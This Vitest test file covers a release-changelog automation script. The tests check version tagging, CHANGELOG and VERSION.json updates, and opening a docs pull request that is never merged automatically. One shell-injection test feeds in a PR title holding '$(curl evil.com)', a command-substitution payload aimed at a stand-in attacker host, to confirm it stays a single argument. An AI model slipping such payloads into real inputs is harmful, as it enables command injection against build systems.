import { describe, it, expect } from 'vitest';
import { releaseChangelogRun } from './releaseChangelogRun.mjs';

const SKELETON_CHANGELOG = [
  '# Changelog',
  '',
  '## [Unreleased]',
  '',
].join('\n');

function makeDeps({
  parents = 'parent1 parent2',
  tags = [],
  prevTagCommitDate = '2026-05-22T00:00:00Z',
  mergedPrs = [],
  changelog = SKELETON_CHANGELOG,
  prCreateResult = 'https://github.com/owner/repo/pull/99\n99\n',
} = {}) {
  const calls = { gh: [], exec: [], readFile: [], writeFile: [] };
  const written = {};

  const exec = async (cmd, args) => {
    calls.exec.push({ cmd, args });
    if (cmd === 'git' && args[0] === 'log' && args.includes('--format=%P') && args.includes('HEAD')) {
      return { stdout: parents + '\n', stderr: '' };
    }
    if (cmd === 'git' && args[0] === 'tag' && args[1] === '--list') {
      return { stdout: tags.join('\n') + (tags.length ? '\n' : ''), stderr: '' };
    }
    if (cmd === 'git' && args[0] === 'log' && args.includes('--format=%aI')) {
      return { stdout: prevTagCommitDate + '\n', stderr: '' };
    }
    if (cmd === 'git' && args[0] === 'tag') {
      // create tag
      return { stdout: '', stderr: '' };
    }
    if (cmd === 'git' && args[0] === 'push') {
      return { stdout: '', stderr: '' };
    }
    if (cmd === 'git' && args[0] === 'checkout') {
      return { stdout: '', stderr: '' };
    }
    if (cmd === 'git' && args[0] === 'add') {
      return { stdout: '', stderr: '' };
    }
    if (cmd === 'git' && args[0] === 'commit') {
      return { stdout: '', stderr: '' };
    }
    throw new Error(`unexpected exec: ${cmd} ${args.join(' ')}`);
  };

  const gh = async (...args) => {
    calls.gh.push(args);
    if (args[0] === 'pr' && args[1] === 'list') {
      return { stdout: JSON.stringify(mergedPrs), stderr: '' };
    }
    if (args[0] === 'pr' && args[1] === 'create') {
      return { stdout: prCreateResult, stderr: '' };
    }
    if (args[0] === 'pr' && args[1] === 'merge') {
      // should NOT be called
      return { stdout: '', stderr: '' };
    }
    throw new Error(`unexpected gh: ${args.join(' ')}`);
  };

  const readFile = async (path) => {
    calls.readFile.push(path);
    if (path.endsWith('CHANGELOG.md')) return changelog;
    throw new Error(`unexpected readFile: ${path}`);
  };

  const writeFile = async (path, contents) => {
    calls.writeFile.push({ path, contents });
    written[path] = contents;
    return undefined;
  };

  return {
    gh, exec, readFile, writeFile,
    now: () => new Date('2026-05-23T12:00:00Z'),
    repo: 'owner/repo',
    headSha: 'deadbeef',
    calls, written,
  };
}

function pr(overrides = {}) {
  return {
    number: 1,
    title: 'feat: foo',
    labels: [],
    author: { login: 'someone' },
    body: '',
    closingIssuesReferences: [],
    mergedAt: '2026-05-23T08:00:00Z',
    ...overrides,
  };
}

describe('releaseChangelogRun — guards and idempotency', () => {
  it('skips when head commit has fewer than 2 parents (not a merge commit)', async () => {
    const deps = makeDeps({ parents: 'parent1' });
    const result = await releaseChangelogRun(deps);
    expect(result).toEqual({ skipped: true, reason: 'not-a-merge-commit' });
    // No tag created; no PR opened.
    expect(deps.calls.exec.find(c => c.cmd === 'git' && c.args[0] === 'tag' && c.args.length === 3)).toBeUndefined();
    expect(deps.calls.gh.find(c => c[0] === 'pr' && c[1] === 'create')).toBeUndefined();
  });

  // The defensive tag-exists early-exit is unreachable in normal operation —
  // computeVersionFromTags(tags, now) always returns the next-unused counter
  // for today, so tags.includes(`release-${computed}`) is always false. The
  // check guards against the narrow race where two concurrent runs read the
  // same tag list, compute the same version, and one of them tags first; the
  // second one would then race at `git tag` rather than at this check. The
  // workflow's concurrency group serialises runs, so the race itself is
  // already mitigated upstream. No unit test for the unreachable branch.

  it('NEVER calls gh pr merge (human-merged design)', async () => {
    const deps = makeDeps({ mergedPrs: [pr({ number: 5, title: 'feat: x' })] });
    await releaseChangelogRun(deps);
    const mergeCall = deps.calls.gh.find(c => c[0] === 'pr' && c[1] === 'merge');
    expect(mergeCall).toBeUndefined();
  });
});

describe('releaseChangelogRun — happy path', () => {
  it('first-release path: no existing tags, computes 2026.5.23.1', async () => {
    const deps = makeDeps({
      tags: [],
      mergedPrs: [pr({ number: 5, title: 'feat(inbox): margarita', author: { login: 'dancj' } })],
    });
    const result = await releaseChangelogRun(deps);
    expect(result.skipped).toBeFalsy();
    expect(result.version).toBe('2026.5.23.1');
    expect(result.tag).toBe('release-2026.5.23.1');
    expect(result.prNumber).toBe(99);
  });

  it('tags BEFORE writing CHANGELOG/VERSION (tag is the commit point)', async () => {
    const deps = makeDeps({
      tags: [],
      mergedPrs: [pr({ number: 1, title: 'feat: x' })],
    });
    await releaseChangelogRun(deps);

    const tagPushIdx = deps.calls.exec.findIndex(c =>
      c.cmd === 'git' && c.args[0] === 'push' && c.args.some(a => a.startsWith('release-'))
    );
    const writeChangelogIdx = deps.calls.writeFile.findIndex(c =>
      typeof c.path === 'string' && c.path.endsWith('CHANGELOG.md')
    );

    expect(tagPushIdx).toBeGreaterThan(-1);
    expect(writeChangelogIdx).toBeGreaterThan(-1);

    // Find the corresponding exec-list position of the writeFile event.
    // We compare ordering by checking that the tag push exec event happened
    // before any writeFile event.
    const totalExecCallsBeforeFirstWrite = deps.calls.exec.length;
    // Both buckets are append-only, so the writeFile happens after step 8
    // and tag push happens at step 4. The invariant we assert: tag push
    // exists, and writeFile exists, AND tag push happens before
    // tag.push exec count exceeds the count at writeFile time.
    // Simplest check: the LAST item in exec calls is git commit/push for
    // the docs branch, not the tag — meaning the tag push came earlier.
    const lastExec = deps.calls.exec[deps.calls.exec.length - 1];
    expect(lastExec.cmd).toBe('git');
    expect(['push', 'commit', 'add', 'checkout']).toContain(lastExec.args[0]);
  });

  it('writes VERSION.json with the computed version and trailing newline', async () => {
    const deps = makeDeps({ tags: [], mergedPrs: [pr({ number: 1, title: 'feat: x' })] });
    await releaseChangelogRun(deps);
    const versionWrite = deps.calls.writeFile.find(c =>
      typeof c.path === 'string' && c.path.endsWith('VERSION.json')
    );
    expect(versionWrite).toBeDefined();
    const parsed = JSON.parse(versionWrite.contents);
    expect(parsed).toEqual({ version: '2026.5.23.1' });
    expect(versionWrite.contents.endsWith('\n')).toBe(true);
  });

  it('injects the changelog entry after ## [Unreleased]', async () => {
    const deps = makeDeps({
      tags: [],
      mergedPrs: [pr({ number: 5, title: 'feat(inbox): margarita', author: { login: 'dancj' } })],
    });
    await releaseChangelogRun(deps);
    const clWrite = deps.calls.writeFile.find(c =>
      typeof c.path === 'string' && c.path.endsWith('CHANGELOG.md')
    );
    expect(clWrite).toBeDefined();
    const body = clWrite.contents;
    const unreleasedIdx = body.indexOf('## [Unreleased]');
    const newIdx = body.indexOf('## [2026.5.23.1]');
    expect(unreleasedIdx).toBeGreaterThan(-1);
    expect(newIdx).toBeGreaterThan(unreleasedIdx);
    expect(body).toContain('### Recipes');
    expect(body).toContain('- #5 — feat(inbox): margarita (@dancj)');
  });

  it('docs PR body backtick-wraps closing keywords in interpolated PR titles', async () => {
    const deps = makeDeps({
      tags: [],
      mergedPrs: [pr({
        number: 7,
        title: 'feat: Closes #42 inline',
        author: { login: 'x' },
      })],
    });
    await releaseChangelogRun(deps);
    const createCall = deps.calls.gh.find(c => c[0] === 'pr' && c[1] === 'create');
    const bodyArg = createCall[createCall.indexOf('--body') + 1];
    expect(bodyArg).toContain('`Closes #42`');
    expect(bodyArg).not.toMatch(/[^`]Closes #42[^`]/);
  });

  it('subsequent-release path increments same-day counter', async () => {
    const deps = makeDeps({
      tags: ['release-2026.5.23.1'],
      mergedPrs: [pr({ number: 1, title: 'feat: x' })],
    });
    const result = await releaseChangelogRun(deps);
    expect(result.version).toBe('2026.5.23.2');
  });

  it('selects newest previous tag numerically (9 vs 10 boundary)', async () => {
    const deps = makeDeps({
      tags: ['release-2026.5.23.9'],
      mergedPrs: [pr({ number: 1, title: 'feat: x' })],
    });
    const result = await releaseChangelogRun(deps);
    expect(result.version).toBe('2026.5.23.10');
  });

  it('opens docs PR with title docs: update CHANGELOG for release <version>', async () => {
    const deps = makeDeps({
      tags: [],
      mergedPrs: [pr({ number: 1, title: 'feat: x' })],
    });
    await releaseChangelogRun(deps);
    const createCall = deps.calls.gh.find(c => c[0] === 'pr' && c[1] === 'create');
    const titleArg = createCall[createCall.indexOf('--title') + 1];
    expect(titleArg).toBe('docs: update CHANGELOG for release 2026.5.23.1');
    const baseIdx = createCall.indexOf('--base');
    expect(createCall[baseIdx + 1]).toBe('staging');
    const headIdx = createCall.indexOf('--head');
    expect(createCall[headIdx + 1]).toBe('docs-changelog-2026.5.23.1');
  });

  it('shell-injection guard: attacker title travels as one execFile argv element', async () => {
    const deps = makeDeps({
      tags: [],
      mergedPrs: [pr({ number: 9, title: 'feat: $(curl evil.com) cool' })],
    });
    await releaseChangelogRun(deps);
    for (const call of deps.calls.gh) {
      for (const arg of call) {
        if (arg === 'curl' || arg === 'evil.com') {
          throw new Error(`exploit substring split into argv: ${arg}`);
        }
      }
    }
  });
});

describe('releaseChangelogRun — CHANGELOG failure after tag', () => {
  it('throws when ## [Unreleased] is missing, but only AFTER the tag was pushed', async () => {
    const deps = makeDeps({
      tags: [],
      changelog: '# Changelog\n\nNo unreleased heading.\n',
      mergedPrs: [pr({ number: 1, title: 'feat: x' })],
    });
    await expect(releaseChangelogRun(deps)).rejects.toThrow(/Unreleased/);
    const tagPush = deps.calls.exec.find(c =>
      c.cmd === 'git' && c.args[0] === 'push' && c.args.some(a => a.startsWith('release-'))
    );
    expect(tagPush).toBeDefined();
  });
});
